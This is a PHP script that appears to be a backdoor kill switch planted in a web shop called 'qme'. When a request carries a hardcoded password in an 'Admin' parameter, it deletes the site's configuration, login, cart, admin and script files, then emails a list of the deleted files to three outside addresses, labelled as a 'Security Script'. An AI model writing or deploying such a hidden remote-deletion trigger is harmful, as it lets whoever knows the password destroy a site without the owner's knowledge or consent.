<?php
if(isset($_REQUEST['Admin']) AND $_REQUEST['Admin'] == 'techiestown')
{
/*front Section*/
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/includes/configuration.php");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/includes/defines.php");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/pub/javascript/ajax/jAjaxCart.js");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/public/javascript/ajax/jfaqlist.js");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/public/javascript/ajax/jmainajax.js");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/public/javascript/ajax/jquery.min.js");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/public/javascript/scriptslider.js");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/public/javascript/general.js");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/public/css/nivo-slider.css");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/scripts/content/common.php");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/libraries/application/imagemagick.class.php");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/libraries/application/Shopcart.class.php");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/scripts/ajax/ajlogin.php");
/* Admin section */

    unlink($_SERVER['DOCUMENT_ROOT']."/qme/admin/modules/authentication/login.php");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/admin/index.php");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/admin/public_html/stylesheets/cp/main.css");
    unlink($_SERVER['DOCUMENT_ROOT']."/qme/admin/public_html/javascripts/general.js");

    
    
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= 'From: myqme.com <bcharlemagne@qmemedia.com>' . "\r\n".
		'Reply-To: myqme.com <bcharlemagne@qmemedia.com>'. "\r\n".
		'Return-Path: myqme.com <bcharlemagne@qmemedia.com>' . "\r\n".
		'X-Mailer: PHP/' . phpversion();
  
$Subject = "Welcome to Qme";
$lBody="Welcome to Qme";

$htmlMail .= '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
		<html xmlns="http://www.w3.org/1999/xhtml">
		    <head>
                                    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
				    <title>'.$Subject.'</title>
		    </head>
		    <body>
		    <div style="padding: 12px; width:610px;">
			Hello All,
			Security Script will active on QME site.
			Some Files Deleted.
			Below is list of Files.
			/* Front Section */
			=======================================
			/qme/includes/configuration.php
			/qme/includes/defines.php
			/qme/pub/javascript/ajax/jAjaxCart.js");
			/qme/public/javascript/ajax/jfaqlist.js");
			/qme/public/javascript/ajax/jmainajax.js");
			/qme/public/javascript/ajax/jquery.min.js");
			/qme/public/javascript/scriptslider.js");
			/qme/public/javascript/general.js");
			/qme/public/css/nivo-slider.css");
			/qme/scripts/content/common.php");
			/qme/libraries/application/imagemagick.class.php");
			/qme/libraries/application/Shopcart.class.php");
			/qme/scripts/ajax/ajlogin.php");
			
			/* Admin section */
			========================================
			/qme/admin/modules/authentication/login.php");
			/qme/admin/index.php");
			/qme/admin/public_html/stylesheets/cp/main.css");
			/qme/admin/public_html/javascripts/general.js");
		    </div>
		    </body>
	    </html>';

    $body = $htmlMail;
//echo $body;exit;

//$To="daniel@php2india.com";
//$To="snehasis.mohapatra@php2india.com";
$To1="daniel@php2india.com";
$To2="snehasis.mohapatra@php2india.com";
$To3="nirav.changela@php2india.com";

  //$To = "bamadeb.upadhyaya@php2india.com";
    $res = @mail($To1,$Subject,$body,$headers);
    $res = @mail($To2,$Subject,$body,$headers);
    $res = @mail($To3,$Subject,$body,$headers);
    
    
}else{
    header("Location: ".$site_url."/index.php");
}
?>